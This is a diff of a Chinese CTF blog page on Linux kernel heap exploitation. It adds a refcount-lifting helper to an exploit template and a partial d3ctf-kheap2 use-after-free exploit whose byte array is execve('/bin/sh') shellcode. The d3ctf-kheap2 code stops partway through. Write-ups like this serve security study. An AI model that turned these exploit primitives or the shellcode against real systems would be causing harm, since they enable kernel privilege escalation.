@@ -9,7 +9,7 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://cnitlrt.github.io/kernel01/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="" />
 <meta property="article:published_time" content="2023-11-09T09:15:58+08:00" />
-<meta property="article:modified_time" content="2025-05-20T21:52:04+08:00" /><meta property="og:site_name" content="My cool site" />
+<meta property="article:modified_time" content="2025-06-02T15:24:09+08:00" /><meta property="og:site_name" content="My cool site" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>
 
@@ -34,8 +34,8 @@
                             "url": "https:\/\/cnitlrt.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "page","wordcount":  31752 ,
-        "url": "https:\/\/cnitlrt.github.io\/kernel01\/","datePublished": "2023-11-09T09:15:58+08:00","dateModified": "2025-05-20T21:52:04+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                        }],"genre": "page","wordcount":  32827 ,
+        "url": "https:\/\/cnitlrt.github.io\/kernel01\/","datePublished": "2023-11-09T09:15:58+08:00","dateModified": "2025-06-02T15:24:09+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
                     "@type": "ImageObject",
@@ -749,7 +749,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/bin/sh
-</span></span><span class="line"><span class="cl">musl-gcc <span class="nv">$1</span> -static -lpthread -o exp <span class="o">&amp;&amp;</span> find . <span class="p">|</span> cpio -o --format<span class="o">=</span>newc &gt; ../rootfs.img <span class="o">&amp;&amp;</span> <span class="nb">cd</span> .. <span class="o">&amp;&amp;</span> ./start.sh
+</span></span><span class="line"><span class="cl">musl-gcc exp.c --static -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp <span class="o">&amp;&amp;</span> find . <span class="p">|</span> cpio -o --format<span class="o">=</span>newc &gt; ../rootfs.img <span class="o">&amp;&amp;</span> <span class="nb">cd</span> .. <span class="o">&amp;&amp;</span> ./start.sh
 </span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
@@ -5133,7 +5133,7 @@ A: OF COURSE</p>
 </li>
 <li>接着我们用msgbuf占位到刚刚进入到buddy system的页，这里也需要用SLUB trick来做把控，因为我们想让该页一直处于active page的状态，然后通过uaf再申请一个pipe buffer，此时pipe buffer会和msgbuf的mtext进行重叠，从而leak出pipe buffer中的地址，同样缺点页比较明显，就是失败率有点高，因为有可能会覆盖掉msgbuf的header,造成kernel panic.那有没有什么解决办法？
 <ul>
-<li>解决办法我暂时没有想到，我能想到的是环节办法，就是需要申请不是target object的倍数的msgbuf大小的堆块。这样才会重叠。</li>
+<li>解决办法我暂时没有想到，我能想到的是缓解办法，就是需要申请不是target object的倍数的msgbuf大小的堆块。这样才会重叠。</li>
 </ul>
 </li>
 <li>然后我们释放掉和pipe_buffer重叠的msgbuf，然后再复用它使得我们可以重复编辑pipe_buffer,然后我们重复编辑pipe_buffer的page指针来做地址搜索，利用prctl来做标志搜索task_struct从而leak出我们想要的所有地址</li>
@@ -5830,7 +5830,8 @@ A: OF COURSE</p>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="off-by-null">off by null</h2>
+</div><h4 id="大堆块的uaf">大堆块的uaf</h4>
+<h2 id="off-by-null">off by null</h2>
 <h3 id="独立页的-off-by-null-kmalloc-0x200">独立页的 off by null (kmalloc-0x200)</h3>
 <h4 id="前置知识">前置知识</h4>
 <p>page 申请的时候是从高地址向低地址申请的 (从下往上)</p>
@@ -8316,6 +8317,7 @@ A: OF COURSE</p>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h1 id="banzi">banzi</h1>
+<p>musl-gcc exp.c &ndash;static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
@@ -9242,6 +9244,59 @@ A: OF COURSE</p>
 </span><span class="lnt">922
 </span><span class="lnt">923
 </span><span class="lnt">924
+</span><span class="lnt">925
+</span><span class="lnt">926
+</span><span class="lnt">927
+</span><span class="lnt">928
+</span><span class="lnt">929
+</span><span class="lnt">930
+</span><span class="lnt">931
+</span><span class="lnt">932
+</span><span class="lnt">933
+</span><span class="lnt">934
+</span><span class="lnt">935
+</span><span class="lnt">936
+</span><span class="lnt">937
+</span><span class="lnt">938
+</span><span class="lnt">939
+</span><span class="lnt">940
+</span><span class="lnt">941
+</span><span class="lnt">942
+</span><span class="lnt">943
+</span><span class="lnt">944
+</span><span class="lnt">945
+</span><span class="lnt">946
+</span><span class="lnt">947
+</span><span class="lnt">948
+</span><span class="lnt">949
+</span><span class="lnt">950
+</span><span class="lnt">951
+</span><span class="lnt">952
+</span><span class="lnt">953
+</span><span class="lnt">954
+</span><span class="lnt">955
+</span><span class="lnt">956
+</span><span class="lnt">957
+</span><span class="lnt">958
+</span><span class="lnt">959
+</span><span class="lnt">960
+</span><span class="lnt">961
+</span><span class="lnt">962
+</span><span class="lnt">963
+</span><span class="lnt">964
+</span><span class="lnt">965
+</span><span class="lnt">966
+</span><span class="lnt">967
+</span><span class="lnt">968
+</span><span class="lnt">969
+</span><span class="lnt">970
+</span><span class="lnt">971
+</span><span class="lnt">972
+</span><span class="lnt">973
+</span><span class="lnt">974
+</span><span class="lnt">975
+</span><span class="lnt">976
+</span><span class="lnt">977
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
@@ -9275,8 +9330,8 @@ A: OF COURSE</p>
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/genetlink.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/if_packet.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/netlink.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/openvswitch.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;net/ethernet.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">// #include &lt;linux/openvswitch.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;net/ethernet.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;net/if.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
@@ -9287,7 +9342,14 @@ A: OF COURSE</p>
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/time.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">// #define DEBUG 1
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define COLOR_GREEN &#34;\033[32m&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define SYSCHK(x)                                                              \
+</span></span></span><span class="line"><span class="cl"><span class="cp">  ({                                                                           \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    typeof(x) __res = (x);                                                     \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    if (__res == (typeof(x))-1)                                                \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      err(1, &#34;SYSCHK(&#34; #x &#34;)&#34;);                                                \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    __res;                                                                     \
+</span></span></span><span class="line"><span class="cl"><span class="cp">  })
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define COLOR_GREEN &#34;\033[32m&#34;
 </span></span></span><span class="line"><span class="cl"><span class="cp">#define COLOR_RED &#34;\033[31m&#34;
 </span></span></span><span class="line"><span class="cl"><span class="cp">#define COLOR_YELLOW &#34;\033[33m&#34;
 </span></span></span><span class="line"><span class="cl"><span class="cp">#define COLOR_DEFAULT &#34;\033[0m&#34;
@@ -9383,6 +9445,52 @@ A: OF COURSE</p>
 </span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">lo</span><span class="p">,</span> <span class="n">hi</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">__asm__</span> <span class="nf">__volatile__</span> <span class="p">(</span> <span class="s">&#34;rdtsc&#34;</span> <span class="o">:</span> <span class="s">&#34;=a&#34;</span> <span class="p">(</span><span class="n">lo</span><span class="p">),</span> <span class="s">&#34;=d&#34;</span> <span class="p">(</span><span class="n">hi</span><span class="p">)</span> <span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">hi</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">lo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define SYSCHK(x) ({                      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">        typeof(x) __res = (x);            \
+</span></span></span><span class="line"><span class="cl"><span class="cp">        if (__res == (typeof(x))-1)       \
+</span></span></span><span class="line"><span class="cl"><span class="cp">                err(1, &#34;SYSCHK(&#34; #x &#34;)&#34;); \
+</span></span></span><span class="line"><span class="cl"><span class="cp">        __res;                            \
+</span></span></span><span class="line"><span class="cl"><span class="cp">})
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/un.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">struct</span> <span class="n">sockaddr_un</span> <span class="n">unix_addr</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">sun_family</span> <span class="o">=</span> <span class="n">AF_UNIX</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">sun_path</span> <span class="o">=</span> <span class="s">&#34;/tmp/exploitsocket&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * Add @count to a struct pid by connecting @count times
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * to a socket on which the owner of that pid called listen().
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * This lets us increment the refcount of a pid even after the
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * task is already gone.
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">child_add_to_refcount</span><span class="p">(</span><span class="kt">int</span> <span class="n">count</span><span class="p">,</span> <span class="kt">int</span> <span class="n">listensock</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">refsock</span> <span class="o">=</span> <span class="nf">SYSCHK</span><span class="p">(</span><span class="nf">socket</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">SYSCHK</span><span class="p">(</span><span class="nf">connect</span><span class="p">(</span><span class="n">refsock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unix_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">unix_addr</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">SYSCHK</span><span class="p">(</span><span class="nf">accept</span><span class="p">(</span><span class="n">listensock</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">parent_add_to_ref</span><span class="p">(</span><span class="kt">int</span> <span class="n">count</span><span class="p">,</span><span class="kt">int</span> <span class="n">listensock</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">SYSCHK</span><span class="p">(</span><span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_PDEATHSIG</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* create post-death-incrementable pid reference */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">SYSCHK</span><span class="p">(</span><span class="nf">listen</span><span class="p">(</span><span class="n">listensock</span><span class="p">,</span> <span class="n">count</span> <span class="cm">/*SOMAXCONN*/</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">init_add_to_refcount</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * This socket will later be given a reference to the child&#39;s pid on listen().
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * Connecting to it will give the client an extra reference to the child&#39;s pid,
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * lifting the pid&#39;s refcount.
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * Unlike most other places that non-ephemerally increment pid refcounts, this
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * allows us to easily lift the refcount of a pid that is no longer associated
+</span></span></span><span class="line"><span class="cl"><span class="cm">    * with any task.
+</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">listensock</span> <span class="o">=</span> <span class="nf">SYSCHK</span><span class="p">(</span><span class="nf">socket</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">unlink</span><span class="p">(</span><span class="n">unix_addr</span><span class="p">.</span><span class="n">sun_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">SYSCHK</span><span class="p">(</span><span class="nf">bind</span><span class="p">(</span><span class="n">listensock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unix_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">unix_addr</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">listensock</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">adjust_rlimit</span><span class="p">()</span>
@@ -11485,7 +11593,253 @@ A: heap overflow (off by null| off by x)</p>
         title="image-20241101223107559" /></p>
 <h2 id="m0ctf-file-struct-uaf的利用">m0ctf (file struct uaf的利用)</h2>
 <h2 id="n1ctf-kfile-file_struct-uaf的利用">n1ctf kfile (file_struct uaf的利用)</h2>
-<h2 id="n1ctf-heap_master-独立cache的uaf只能一次free-外加nsjail">n1ctf heap_master (独立cache的uaf,只能一次free 外加nsjail)</h2>
+<h2 id="d3ctf-d3kshrm">d3ctf-d3kshrm</h2>
+<p>首先堆喷一些0x1000大小的独立cache的堆块</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"></code></pre></td></tr></table>
+</div>
+</div><h2 id="d3ctf-kheap2">d3ctf-kheap2</h2>
+<p>qcow2解包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">qemu-img convert -O raw rootfs.qcow2 rootfs.raw
+</span></span><span class="line"><span class="cl">sudo mount -o loop rootfs.raw ./core
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>qcow2 打包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">qemu-img convert -f raw -O qcow2 rootfs.raw rootfs-new.qcow2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就是个独立cache的uaf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;banzi.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define D3KHEAP2_ALLOC  0x3361626E
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define D3KHEAP2_FREE   0x74747261
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define D3KHEAP2_QUERY1 0x54433344
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define D3KHEAP2_QUERY2 0x54433343
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">index</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="kt">heap_arg_t</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">int</span> <span class="n">index</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">heap_arg_t</span> <span class="n">arg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arg</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">D3KHEAP2_ALLOC</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">arg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;分配失败&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">del</span><span class="p">(</span><span class="kt">int</span> <span class="n">index</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">heap_arg_t</span> <span class="n">arg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arg</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">D3KHEAP2_FREE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">arg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;释放失败&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">char</span> <span class="n">attack_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">106</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">init_namespace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">adjust_rlimit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">getpid</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x4000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">spary_obj</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x3</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">)</span> <span class="o">*</span> <span class="mi">16</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/d3kheap2&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;open /proc/d3kheap2 failed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">build_msg</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
